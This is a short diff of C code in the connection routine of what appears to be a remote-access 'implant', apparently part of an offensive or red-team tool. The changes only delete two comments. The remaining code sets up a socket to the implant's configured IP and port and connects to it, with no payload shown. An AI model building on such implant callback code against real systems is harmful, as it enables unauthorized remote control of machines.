@@ -98,7 +98,7 @@ int init_remote_connection(implant_t *instance) {
     struct sockaddr_in addr = {
         .sin_family = AF_INET,
         .sin_port = htons(instance->port),
-        .sin_addr.s_addr = inet_addr(instance->ip) /* FIXME(djnn): support for domain names */
+        .sin_addr.s_addr = inet_addr(instance->ip)
     };
 
 
@@ -119,7 +119,6 @@ int init_remote_connection(implant_t *instance) {
         return -1;
     }
 
-    /* connecting to remote server */
     if (connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
 
 #ifdef DEBUG
